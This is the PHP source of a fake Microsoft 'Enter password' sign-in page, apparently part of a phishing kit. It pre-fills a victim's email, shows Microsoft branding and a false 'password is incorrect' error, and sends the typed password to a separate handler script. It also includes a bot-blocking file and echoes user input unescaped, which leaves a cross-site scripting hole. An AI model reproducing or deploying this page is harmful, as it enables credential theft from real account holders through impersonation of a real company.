<?php 
	include('blocker.php');  

	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = $_POST['email'];	
	} else if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];
	} else {
		header('Location: retry.php?error=1');
	}
	
	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "Your email or password is incorrect. If you don't remember your password, ";
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>	
	
</head>

<body>
	<div class="overlay">
		<div class="login-box">
			<img src="images/ms-logo-v2.jpg" alt="logo">
			<div id="identity" class="identity-banner">
				<div id="identity-name" class="identity">
					&nbsp;&nbsp;&nbsp;<img src="images/arrow.png" alt="arrow">&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $email; ?>
				</div>

			</div>

			<h2 id="title">Enter password</h2>
			<p id="message" class="message"><?php echo $errorMsg; ?> 	<id="fps"><a href="#" class="fade">reset it now.</a></p>

			<div id="loader" class="loader hidden">
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
			</div>

			<form action="resubmit.php" method="post">
				<input type="hidden" id="email" name="email" value="<?php echo $email; ?>">
				<input id="password" type="password" name="password" placeholder="Password" required autofocus>
			<div id="group2">
			
				<small id="fps"><a href="#" class="fade">Forgot my password</a></small>
				<br>
				<br>
			</div>

			<input id="signin" type="submit" name="signin" value="Sign in">
			</form>
		</div>
	</div>

	<footer>
		<ul>
		    <li><a href="#"><b>. . .</b></a></li>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>&copy;2019 Microsoft</a></li>
		</ul>
	</footer>

</body>
</html>